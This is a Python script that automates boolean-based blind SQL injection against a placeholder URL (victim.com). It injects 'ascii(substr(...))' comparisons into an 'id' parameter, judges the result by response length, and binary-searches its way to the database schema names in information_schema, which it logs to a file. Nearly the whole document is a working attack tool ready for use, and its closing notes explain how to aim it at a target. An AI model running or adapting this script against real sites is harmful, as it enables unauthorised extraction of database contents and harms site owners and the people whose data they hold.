#!/usr/bin/python

import requests
import re
import sys

url = "https://www.victim.com/index.php?id=1"
trail = "#"

# True and False responses (in bytes)
good = 8808
bad = 1800 # 1720 exactly
 

# Characters Printable and usable: 32-126
global_top_char = 126
global_bottom_char = 32

comparators = {'equal':'=','lower':'<','greater':'>'}
word = []

def get_next_char(bottom_char, top_char):
	return int((top_char+bottom_char)/2)
		
"""
and ascii(substr((select table_schema FROM information_schema.tables limit 1 offset ${row_index:1}),${char_index:1},1))${comparator:>}${char_val:0} #
"""
"""
The string can be tested by comparing with >0 , False indicates the string end
"""
def blind():	

	check_row = " and ascii(substr((select table_schema FROM information_schema.tables limit 1 offset ${row_index}),1,1))>0"
	
	body = " and ascii(substr((select table_schema FROM information_schema.tables limit 1 offset ${row_index}),${char_index},1))${comparator}${char_val}"
	
	for row_index in range(0,1000): #this is a giant for to manage the offset (row index)
		aux = check_row.replace("${row_index}",str(row_index)) 
		injection = url + aux + trail
		r = requests.get(injection,verify=False)
		if len(r.text) > bad:			
			aux = body.replace("${row_index}",str(row_index))
			word = []
			binary_search(aux)
			
	"""injection = url + body + trail
	r = requests.get(injection,verify=False)
	print r
	"""

	
def binary_search(body, char_index=1):
	body_search = body.replace("${char_index}", str(char_index))	
	body_search = body_search.replace("${comparator}", comparators['greater'])
	char_val = get_next_char(global_bottom_char, global_top_char)
	local_bottom_char = global_bottom_char
	local_top_char = global_top_char
	equal = False
	distance = 100
	while not equal:		
		if distance == 1:
			char_val += 1
			body_check = body_search.replace("${char_val}",str(char_val))
			body_match = body_check.replace(comparators['greater'], comparators['equal'])
			injection = url + body_match + trail # Exact Match
		else:
			body_check = body_search.replace("${char_val}",str(char_val))
			injection = url + body_check + trail # Still searching
		
		print "Current Injection"
		print injection
		print "--------------------------------------------------------------------------------"
		
		r = requests.get(injection,verify=False)
		if len(r.text) > bad: #True response
			if distance == 1: #Finish the word here
				word.append(char_val)				
				equal = True
			else:
				#This means the character is greater than our check
				local_bottom_char = char_val
				char_val = get_next_char(local_bottom_char, local_top_char)
				distance = local_top_char - local_bottom_char
				
		else: # False response
			if distance == 1: # This is an Error
				print "[*] ERR"
				sys.exit(1)
				
			else:
				#This means the character is lower than our check
				local_top_char = char_val
				char_val = get_next_char(local_bottom_char, local_top_char)
				distance = local_top_char - local_bottom_char
				
	char_index += 1	
	body_check_end = body.replace("${char_index}", str(char_index))
	body_check_end = body_check_end.replace("${comparator}", comparators['greater'])
	body_check_end = body_check_end.replace("${char_val}","0")
	injection_check_end = url + body_check_end + trail
	r = requests.get(injection_check_end,verify=False)
	if len(r.text) > bad:
		binary_search(body,char_index)
	else:
		value = [chr(x) for x in word]
		print word
		print value
		line = "[+] " + "".join(value)
		with open("output.txt", "a") as f:
			f.writelines(line+"\n")
		print line
		del word[:]
	#check for end of string here at the end	
	
blind()

"""
*) The url of the target with the vulnerable parameter at the end of the querystring
*) The true and false (I only check for the bytes of the server response). You can determine these values in several ways, I made use of firebug.
*) The "check_row" and "body" variables inside blind() function determine the current basic injection.
"""
